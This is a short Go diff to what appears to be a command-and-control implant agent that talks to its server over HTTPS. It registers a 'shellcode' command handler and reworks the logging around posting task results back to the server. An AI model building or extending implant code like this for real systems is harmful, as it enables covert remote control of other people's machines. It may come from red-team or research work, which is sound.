@@ -14,10 +14,9 @@ import (
 
 // Agent implements the Communicator interface for HTTPS
 type Agent struct {
-	serverAddr string
-	client     *http.Client
-
-	commandOrchestrators map[string]OrchestratorFunc
+	serverAddr           string
+	client               *http.Client
+	commandOrchestrators map[string]OrchestratorFunc // Maps commands to their keywords
 }
 
 // NewAgent creates a new HTTPS agent
@@ -85,7 +84,13 @@ func (agent *Agent) Send(ctx context.Context) (*models.ServerResponse, error) {
 	return &serverResp, nil
 }
 
+func registerCommands(agent *Agent) {
+	agent.commandOrchestrators["shellcode"] = (*Agent).orchestrateShellcode
+	// Register other commands here in the future
+}
+
 // SendResult performs a POST request to the ResultsEndpoint to submit task results.
+
 func (agent *Agent) SendResult(resultData []byte) error {
 
 	targetURL := fmt.Sprintf("https://%s/results", agent.serverAddr)
@@ -105,11 +110,11 @@ func (agent *Agent) SendResult(resultData []byte) error {
 	// EXECUTE THE REQUEST
 	resp, err := agent.client.Do(req)
 	if err != nil {
-		log.Printf("|❗ERR COMM H2TLS| Results POST request failed: %v", err)
+		log.Printf("|❗ERR | Results POST request failed: %v", err)
 		return fmt.Errorf("http results post request failed: %w", err)
 	}
 	defer resp.Body.Close() // Close body even if we don't read it, to release resources
 
-	log.Printf("|COMM H2TLS|-> Successfully sent results.")
+	log.Printf("💥 SUCCESSFULLY SENT FINAL RESULTS BACK TO SERVER.")
 	return nil
 }
